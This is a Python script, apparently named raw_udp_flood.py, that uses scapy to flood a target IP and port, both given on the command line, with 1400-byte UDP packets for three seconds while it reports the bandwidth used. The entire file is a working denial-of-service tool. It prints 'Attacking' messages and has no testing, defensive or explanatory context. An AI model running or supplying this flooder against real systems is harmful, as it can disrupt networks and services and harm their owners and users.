import random
import time
import sys
from scapy.all import IP, UDP, Raw, sendp, Ether, get_if_hwaddr, get_if_list
import threading
import psutil

# === CONFIGURATION ===
DURATION = 3  # seconds
PAYLOAD = b"X" * 1400
INTERFACE = get_if_list()[0]  # auto-select first interface

# === BANDWIDTH MONITOR ===
def monitor_bandwidth():
    old_bytes = psutil.net_io_counters(pernic=True)[INTERFACE].bytes_sent
    time.sleep(DURATION)
    new_bytes = psutil.net_io_counters(pernic=True)[INTERFACE].bytes_sent
    used_kbps = ((new_bytes - old_bytes) * 8) / 1000
    print(f"[+] Bandwidth used during flood: {used_kbps:.2f} kbps")

# === FLOOD FUNCTION ===
def raw_udp_flood(target_ip, target_port):
    print(f"[+] Attacking {target_ip}:{target_port} for {DURATION} seconds...")
    threading.Thread(target=monitor_bandwidth).start()
    end_time = time.time() + DURATION
    while time.time() < end_time:
        try:
            pkt = Ether() / IP(dst=target_ip) / UDP(sport=random.randint(1024, 65535), dport=int(target_port)) / Raw(load=PAYLOAD)
            sendp(pkt, iface=INTERFACE, verbose=0)
        except Exception as e:
            print(f"[!] Error: {e}")
    print("[+] Flood complete.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 raw_udp_flood.py <target_ip> <target_port>")
        sys.exit(1)
    raw_udp_flood(sys.argv[1], sys.argv[2])
